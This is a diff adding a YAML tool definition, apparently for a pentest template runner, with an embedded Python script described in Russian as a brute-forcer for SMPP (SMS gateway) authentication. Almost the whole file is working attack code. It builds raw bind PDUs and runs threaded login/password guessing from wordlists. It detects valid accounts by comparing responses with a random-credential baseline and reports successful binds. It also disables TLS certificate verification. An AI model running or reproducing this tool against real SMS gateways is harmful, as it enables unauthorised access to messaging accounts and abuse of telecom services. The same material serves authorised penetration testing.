@@ -1,0 +1,444 @@
+description: Брутилка аутентификации для SMPP-сервисов
+author: vinzekatze, claude.ai
+tags:
+  - smpp
+  - enumeration
+  - burteforce
+  - 2775
+  - 2776
+
+arguments:
+  t:
+    multiple: true
+    description: цели в формате "host:port"
+    replacer: '#target#'
+    metavar: 'HOST:PORT'
+    regex: >-
+      ^([a-zA-Z0-9.-]+|\d{1,3}(\.\d{1,3}){3}):([1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$
+  u:
+    default:
+      -
+    multiple: True
+    description: логин system_id (строки и/или файлы)
+    metavar: LOGIN
+    replacer: '#SYSTEM_ID#'
+  p:
+    default:
+      -
+    multiple: True
+    description: пароль (строки и/или файлы)
+    metavar: PASSWORD
+    replacer: '#PASSWORD#'
+  tls:
+    description: использовать TLS-подключение
+    default:
+      - "False"
+      - "True"
+    replacer: '#TLS#'
+  show-all:
+    default:
+      - "True"
+      - "False"
+    description: показывать все попытки аутентификации
+  system-type:
+    default:
+      - 
+    replacer: '#SYS_TYPE#'
+    regex: '\w+'
+    description: значение SMPP System_Type (по умолчанию пусто, иногда может потребоваться указывать явно SMPP)
+    metavar: TYPE
+  mode:
+    default:
+      - transceiver
+      - transmitter
+      - receiver
+    replacer: '#MODE#'
+    description: режим подключения SMPP
+  timeout:
+    default: 10
+    description: таймаут соединения
+    metavar: SEC
+    regex: '[1-9]\d*'
+  threads:
+    default: 10
+    description: количество потоков для перечисления
+    metavar: NUM
+    regex: '[1-9]\d*'
+
+mode:
+  loop: t
+  format:
+    t: '{!r}'
+    u: '{!r}'
+    p: '{!r}'
+  join:
+    u: ', '
+    p: ', '
+
+shell: python3
+script: |-
+  import socket
+  import ssl
+  import struct
+  import time
+  import warnings
+  import os
+  import signal
+  import sys
+  import threading
+  import random
+  import string
+  from concurrent.futures import ThreadPoolExecutor, as_completed
+  from itertools import product
+  stop_event = threading.Event()
+  warnings.filterwarnings("ignore", category=DeprecationWarning)
+
+  TARGET = #target#
+  TARGET_HOST, TARGET_PORT = TARGET.split(":")
+  LOGINS      = [""] if not [#SYSTEM_ID#] else [#SYSTEM_ID#]
+  PASSWORDS   = [""] if not [#PASSWORD#] else [#PASSWORD#]
+  SYSTEM_TYPE = "#SYS_TYPE#"
+  MODE        = "#MODE#"
+  USE_TLS     = #TLS#
+  TIMEOUT     = #timeout#
+  THREADS     = #threads#
+  WARN_THRESHOLD = 10000
+  ENUM_MOD = #show-all#
+  ENUM_MARKER = {}
+  REPORT_EVERY = 1000
+
+  def my_print(text=""):
+    print(text)
+    sys.stdout.flush()
+
+  def collect_unique_strings(args):
+      result = []
+      seen = set()
+      def add(s: str):
+          if s not in seen:
+              seen.add(s)
+              result.append(s)
+      for arg in args:
+          if os.path.isfile(arg):
+              with open(arg, "r", encoding="utf-8") as f:
+                  for line in f:
+                      add(line.rstrip("\n"))
+          else:
+              add(arg)
+      return result
+
+  class C:
+      RESET = "\033[0m"
+      BOLD  = "\033[1m" 
+      RED   = "\033[1;91m"
+      GREEN = "\033[1;92m"
+      OK    = "\033[0;92m"
+      FAIL  = "\033[0;91m"
+      WARN  = "\033[0;93m"
+      DIM   = "\033[0;37m"
+
+  def header(host, port, section):
+      return f"{C.RED}[{host}:{port}]{C.RESET} {C.GREEN}[{section}]{C.RESET}"
+
+  def ok(msg):   return f"    {C.OK}[OK]{C.RESET}   {msg}"
+  def fail(msg): return f"    {C.FAIL}[FAIL]{C.RESET} {msg}"
+  def warn(msg): return f"    {C.WARN}[INFO]{C.RESET} {msg}"
+  def dim(msg):  return f"    {C.DIM}{msg}{C.RESET}"
+
+  SMPP_STATUS = {
+      0x00000000: "ESME_ROK — success",
+      0x00000001: "ESME_RINVMSGLEN — invalid message length",
+      0x00000002: "ESME_RINVCMDLEN — invalid command length",
+      0x00000003: "ESME_RINVCMDID — invalid command id",
+      0x00000004: "ESME_RINVBNDSTS — incorrect bind status",
+      0x00000005: "ESME_RALYBND — already bound",
+      0x00000006: "ESME_RINVPRTFLG — invalid priority flag",
+      0x00000007: "ESME_RINVREGDLVFLG — invalid registered delivery flag",
+      0x00000008: "ESME_RSYSERR — system error",
+      0x0000000A: "ESME_RINVSRCADR — invalid source address",
+      0x0000000B: "ESME_RINVDSTADR — invalid destination address",
+      0x0000000C: "ESME_RINVMSGID — invalid message id",
+      0x0000000D: "ESME_RBINDFAIL — bind failed (wrong credentials)",
+      0x0000000E: "ESME_RINVPASWD — invalid password",
+      0x0000000F: "ESME_RINVSYSID — invalid system id",
+      0x00000011: "ESME_RCANCELFAIL — cancel failed",
+      0x00000013: "ESME_RREPLACEFAIL — replace failed",
+      0x00000014: "ESME_RMSGQFUL — message queue full",
+      0x00000015: "ESME_RINVSERTYP — invalid service type",
+      0x00000058: "ESME_RTHROTTLED — throttling error",
+      0x000000FE: "ESME_RDELIVERYFAILURE — delivery failure",
+      0x000000FF: "ESME_RUNKNOWNERR — unknown error",
+  }
+
+  SMPP_COMMANDS = {
+      0x00000001: "bind_receiver",
+      0x00000002: "bind_transmitter",
+      0x00000009: "bind_transceiver",
+      0x00000006: "unbind",
+      0x00000015: "enquire_link",
+      0x80000000: "generic_nack",
+      0x80000001: "bind_receiver_resp",
+      0x80000002: "bind_transmitter_resp",
+      0x80000009: "bind_transceiver_resp",
+      0x80000006: "unbind_resp",
+      0x80000015: "enquire_link_resp",
+  }
+
+  def decode_status(val) -> str:
+      code = int(val, 16) if isinstance(val, str) else val
+      return SMPP_STATUS.get(code, "unknown status code")
+
+  def decode_command(val) -> str:
+      code = int(val, 16) if isinstance(val, str) else val
+      return SMPP_COMMANDS.get(code, "unknown command")
+
+  BIND_COMMAND_IDS = {
+      "transceiver": 0x00000009,
+      "transmitter": 0x00000002,
+      "receiver":    0x00000001,
+  }
+
+  def build_bind_pdu(mode, system_id, password, system_type="", sequence=1):
+      command_id = BIND_COMMAND_IDS[mode]
+      body  = system_id.encode()   + b'\x00'
+      body += password.encode()    + b'\x00'
+      body += system_type.encode() + b'\x00'
+      body += struct.pack("BBB", 0x34, 0x00, 0x00)  # version, ton, npi
+      body += b'\x00'                                # address_range
+      length = 16 + len(body)
+      hdr = struct.pack(">IIII", length, command_id, 0x00000000, sequence)
+      return hdr + body
+
+  def build_unbind_pdu(sequence=2):
+      return struct.pack(">IIII", 16, 0x00000006, 0x00000000, sequence)
+
+  def build_enquire_link_pdu(sequence=3):
+      return struct.pack(">IIII", 16, 0x00000015, 0x00000000, sequence)
+
+  def parse_pdu_header(data):
+      if len(data) < 16:
+          return None
+      length, command_id, status, sequence = struct.unpack(">IIII", data[:16])
+      return {"length": length, "command_id": command_id,
+              "status": status, "sequence": sequence}
+
+  def recv_pdu(sock):
+      """Читаем ровно один PDU по его длине из заголовка"""
+      raw_len = b""
+      while len(raw_len) < 4:
+          chunk = sock.recv(4 - len(raw_len))
+          if not chunk:
+              raise ConnectionError("Connection closed by server")
+          raw_len += chunk
+
+      length = struct.unpack(">I", raw_len)[0]
+      raw_rest = b""
+      while len(raw_rest) < length - 4:
+          chunk = sock.recv(length - 4 - len(raw_rest))
+          if not chunk:
+              raise ConnectionError("Connection closed by server")
+          raw_rest += chunk
+
+      return raw_len + raw_rest
+
+  def open_connection(host, port, use_tls=False):
+      # Открывает TCP (и опционально TLS) соединение.
+
+      result = {
+          "sock":        None,
+          "tcp_ok":      False,
+          "tcp_ms":      None,
+          "tls_ok":      None,
+          "tls_ms":      None,
+          "tls_version": None,
+          "tls_cipher":  None,
+          "error":       None,
+      }
+
+      try:
+          t0 = time.time()
+          sock = socket.create_connection((host, int(port)), timeout=TIMEOUT)
+          result["tcp_ok"] = True
+          result["tcp_ms"] = round((time.time() - t0) * 1000, 1)
+
+          if use_tls:
+              ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+              ctx.check_hostname  = False
+              ctx.verify_mode     = ssl.CERT_NONE
+              ctx.minimum_version = ssl.TLSVersion.TLSv1_2
+
+              t0 = time.time()
+              sock = ctx.wrap_socket(sock, server_hostname=host)
+              result["tls_ok"]      = True
+              result["tls_ms"]      = round((time.time() - t0) * 1000, 1)
+              result["tls_version"] = sock.version()
+              result["tls_cipher"]  = sock.cipher()[0]
+
+          sock.settimeout(TIMEOUT)
+          result["sock"] = sock
+
+      except ssl.SSLError as e:
+          result["tls_ok"] = False
+          result["error"]  = f"TLS error: {e}"
+      except Exception as e:
+          result["error"] = str(e)
+
+      return result
+
+  def auth(sock, host, port, system_id, password,
+          mode="transceiver", system_type=""):
+      result = {
+          "system_id":  system_id,
+          "password":   password,
+          "bind_ok":    False,
+          "bind_ms":    None,
+          "cmd_id":     None,
+          "cmd_id_str": None,
+          "status":     None,
+          "status_str": None,
+          "sequence":   None,
+          "pdu_sent":   None,
+          "raw_hex":    None,
+          "error":      None,
+      }
+
+      try:
+          pdu = build_bind_pdu(mode, system_id, password, system_type)
+          result["pdu_sent"] = pdu.hex()
+          sock.sendall(pdu)
+
+          t0 = time.time()
+          raw = recv_pdu(sock)
+          result["bind_ms"] = round((time.time() - t0) * 1000, 1)
+          result["raw_hex"] = raw.hex()
+
+          parsed = parse_pdu_header(raw)
+          if parsed:
+              result["cmd_id"]     = parsed["command_id"]
+              result["cmd_id_str"] = decode_command(parsed["command_id"])
+              result["status"]     = parsed["status"]
+              result["status_str"] = decode_status(parsed["status"])
+              result["sequence"]   = parsed["sequence"]
+              result["bind_ok"]    = parsed["status"] == 0
+
+      except Exception as e:
+          result["error"] = str(e)
+
+      return result
+
+  def close_connection(sock, was_bound=False):
+      if sock is None:
+          return
+
+      try:
+          if was_bound:
+              sock.sendall(build_unbind_pdu())
+              recv_pdu(sock)
+      except Exception:
+          pass
+      finally:
+          try:
+              sock.close()
+          except Exception:
+              pass
+
+  def print_result(auth_result, enum_marker):
+      keys_to_check = ['bind_ok', 'cmd_id', 'status', 'raw_hex']
+
+      diffs = {
+          key: (auth_result.get(key), enum_marker.get(key))
+          for key in keys_to_check
+          if auth_result.get(key) != enum_marker.get(key)
+      }
+
+      if diffs:
+          if auth_result["cmd_id"] is not None:
+              raw_result_str = f"[status: {hex(auth_result['status'])} → {auth_result['status_str']}]"
+          else:
+              raw_result_str = ""
+
+          if auth_result["bind_ok"]:
+              my_print(ok(f"[{auth_result['system_id']}:{auth_result['password']}] [{auth_result['bind_ms']}ms] {raw_result_str}"))
+          elif auth_result["error"]:
+              my_print(fail(f"[{auth_result['system_id']}:{auth_result['password']}] [Error: {auth_result['error']}] {raw_result_str}"))
+          else:
+              my_print(fail(f"[{auth_result['system_id']}:{auth_result['password']}] [{auth_result['bind_ms']}ms] {raw_result_str}"))
+
+  def auth_logic(cred):
+      if stop_event.is_set():
+          return
+      conn = open_connection(TARGET_HOST, TARGET_PORT, use_tls=USE_TLS)
+      auth_result = auth(
+          sock=conn["sock"],
+          host=TARGET_HOST,
+          port=TARGET_PORT,
+          system_id=cred[0],
+          password=cred[1],
+          mode=MODE,
+          system_type=SYSTEM_TYPE,
+      )
+      close_connection(conn["sock"], was_bound=auth_result["bind_ok"])
+      print_result(auth_result, ENUM_MARKER)
+      return auth_result
+
+
+  def signal_handler(sig, frame):
+      my_print()
+      my_print(warn("Stopping threads..."))
+      stop_event.set()
+      sys.exit(0)
+
+  signal.signal(signal.SIGINT, signal_handler)
+
+  if __name__ == "__main__":
+      my_print(f"\n{C.DIM}{'─'*55}{C.RESET}")
+      my_print(f"{C.BOLD}SMPP Auth  —  {TARGET_HOST}:{TARGET_PORT}{C.RESET}")
+      my_print(f"{C.DIM}{'─'*55}{C.RESET}")
+
+      conn_test = open_connection(TARGET_HOST, TARGET_PORT, use_tls=USE_TLS)
+      my_print(f"\n{header(TARGET_HOST, TARGET_PORT, 'Connection test')}")
+      if conn_test["tcp_ok"]:
+          my_print(ok(f"TCP connected  ({conn_test['tcp_ms']}ms)"))
+      else:
+          my_print(fail(f"TCP failed: {conn_test['error']}"))
+
+      if USE_TLS:
+          if conn_test["tls_ok"]:
+              my_print(ok(f"TLS established  ({conn_test['tls_ms']}ms)"))
+              my_print(dim(f"version : {conn_test['tls_version']}"))
+              my_print(dim(f"cipher  : {conn_test['tls_cipher']}"))
+          else:
+              my_print(fail(f"TLS failed: {conn_test['error']}"))
+
+      if not conn_test["sock"]:
+          my_print()
+          exit(1)
+      close_connection(conn_test["sock"])
+
+      my_print(f"\n{header(TARGET_HOST, TARGET_PORT, f'SMPP bind: {MODE}')}")
+      ALL_LOGINS = collect_unique_strings(LOGINS)
+      ALL_PASSWORDS = collect_unique_strings(PASSWORDS)
+      total_comb = len(ALL_LOGINS) * len(ALL_PASSWORDS)
+      if total_comb > WARN_THRESHOLD:
+          my_print(warn(f"Warning: {total_comb:,} combinations generated"))
+          confirm = input(warn("Continue? (y/n): "))
+          if confirm.lower() != 'y':
+              exit()
+
+      if total_comb > 1 and ENUM_MOD:
+          characters = string.ascii_letters + string.digits
+          RAND_LOGIN = ''.join(random.choices(characters, k=10)) if len(ALL_LOGINS) > 1 else ALL_LOGINS[0]
+          RAND_PASSWORD = ''.join(random.choices(characters, k=10)) if len(ALL_PASSWORDS) > 1 else ALL_PASSWORDS[0]
+
+      if total_comb > 1 and ENUM_MOD:
+          ENUM_MARKER = auth_logic([RAND_LOGIN, RAND_PASSWORD])
+          my_print(warn(f"Enumerating..."))
+          with ThreadPoolExecutor(max_workers=THREADS) as executor:
+              futures = [executor.submit(auth_logic, item) for item in product(ALL_LOGINS, ALL_PASSWORDS)]
+              for i, future in enumerate(as_completed(futures), 1):
+                  result = future.result()
+                  if i % REPORT_EVERY == 0 or i == total_comb:
+                      my_print(warn(f"Progress: {i}/{total_comb} ({i/total_comb*100:.1f}%)"))
+      else:
+          with ThreadPoolExecutor(max_workers=THREADS) as executor:
+              results = list(executor.map(auth_logic, product(ALL_LOGINS, ALL_PASSWORDS)))
